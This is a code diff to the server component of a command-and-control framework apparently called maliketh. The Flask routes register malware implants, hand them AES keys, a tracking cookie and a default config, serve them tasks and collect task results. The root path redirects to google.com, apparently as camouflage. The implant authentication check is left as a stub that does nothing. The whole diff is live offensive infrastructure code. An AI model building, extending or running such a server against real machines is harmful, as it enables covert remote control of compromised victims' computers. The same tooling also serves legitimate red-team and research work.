@@ -7,24 +7,30 @@ from maliketh.models import *
 from functools import wraps
 from maliketh.config import ROUTES
 from maliketh.crypto.aes import GCM
+from maliketh.logging.standard_logger import StandardLogger, LogLevel
 import base64
-import logging
 
-c2 = Blueprint('c2', __name__, url_prefix=ROUTES['c2']['base_path'])
+logger = StandardLogger(sys.stdout, sys.stderr, LogLevel.INFO)
+c2 = Blueprint("c2", __name__, url_prefix=ROUTES["c2"]["base_path"])
+
 
 def implant_authenticated(func: Callable):
     """
     Decorator to check if the request is authenticated.
     """
+
     @wraps(func)
     def wrapper(*args, **kwargs):
         # TODO
         return func(*args, **kwargs)
+
     return wrapper
+
 
 @c2.route("/")
 def hello_c2():
     return redirect("https://google.com")
+
 
 @c2.route(ROUTES["c2"]["register"]["path"], methods=ROUTES["c2"]["register"]["methods"])
 def register():
@@ -34,12 +40,14 @@ def register():
     #   "u": "username",
     #   "t": "base64 encoded token"
     # }
-    
+
+    if request.json is None:
+        return "Unauthorized", 401
 
     try:
         u = request.json["u"]
         t = request.json["t"]
-    except:
+    except Exception as e:
         return "Unauthorized", 401
 
     if len(u) > 128:
@@ -67,12 +75,25 @@ def register():
     db.session.add(implant)
     db.session.commit()
 
-    resp = jsonify({"status": True, "id": implant.implant_id, "key": implant.aes_key, "aad": implant.aes_aad})
+    # Create default config
+    config = ImplantConfig.create_min_config(
+        implant_id=implant.implant_id, cookie=ROUTES["c2"]["implant_id_cookie"]
+    )
+
+    resp = jsonify(
+        {
+            "status": True,
+            "id": implant.implant_id,
+            "key": implant.aes_key,
+            "aad": implant.aes_aad,
+            "config": config.toJSON(),
+        }
+    )
     resp.status_code = 200
 
     # Set cookie to implant ID
     resp.set_cookie(ROUTES["c2"]["implant_id_cookie"], implant.implant_id)
-    
+
     return resp
 
 
@@ -102,11 +123,13 @@ def get_task():
     return jsonify({})
 
 
-"""
-Get the output of a task and mark it as completed
-"""
-@c2.route(ROUTES["c2"]["task_results"]["path"], methods=ROUTES["c2"]["task_results"]["methods"])
+@c2.route(
+    ROUTES["c2"]["task_results"]["path"],
+    methods=ROUTES["c2"]["task_results"]["methods"],
+)
 def post_task(tid: str):
+    """
+    Get the output of a task and mark it as completed"""
     # Get implant id from cookie
     implant_id = request.cookies.get(ROUTES["c2"]["implant_id_cookie"])
 
@@ -137,6 +160,3 @@ def post_task(tid: str):
         return "OK"
     # If task is None, return empty task
     return "Not Found", 404
-    
-
-
